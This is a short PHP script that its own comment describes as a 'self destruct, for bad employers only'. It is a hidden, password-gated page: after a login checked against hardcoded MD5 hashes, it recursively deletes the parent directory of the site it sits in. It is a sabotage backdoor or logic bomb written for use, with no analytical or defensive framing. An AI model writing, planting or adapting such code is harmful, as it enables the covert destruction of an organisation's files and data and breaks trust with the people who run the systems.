<?php
//self destruct, for bad employers only lol
$form_text = '
<form action="">
	<input type="text" name="login"/>
	<br/>
	<input type="password" name="password"/>
	<br/>
	<input type="submit" value="login"/>
</form>';
$login = 'd947f2def6d2f32c2fc7df910ed00600';
$password = 'ae6bde22c36ae59daf97463b06d7f43b';
if(empty($_GET['login']) && empty($_GET['password']))
	die($form_text);
if(empty($_GET['login']) || empty($_GET['password']) || md5($_GET['login'])!=$login || md5($_GET['password'])!=$password)
	die('wrong login or p[assword'.$form_text);
$start = '..';//getcwd();

delete_dir($start);

function delete_dir($dir){
	$handle = opendir($dir);
	if($handle){
		$src_dir=scandir($dir);
		foreach($src_dir as $file){
			$path = $dir.'\\'.$file;
			if($file != "." && $file != ".."){
				echo $path.'<br/>';
				try{
					unlink($path);
				}
				catch(Exception $e){
					delete_dir($path);
				}
			}
		}
	    closedir($handle);
	    rmdir($dir);
	}
	else{
		unlink($dir);
	    echo $dir.'<br/>';
	}
}
?>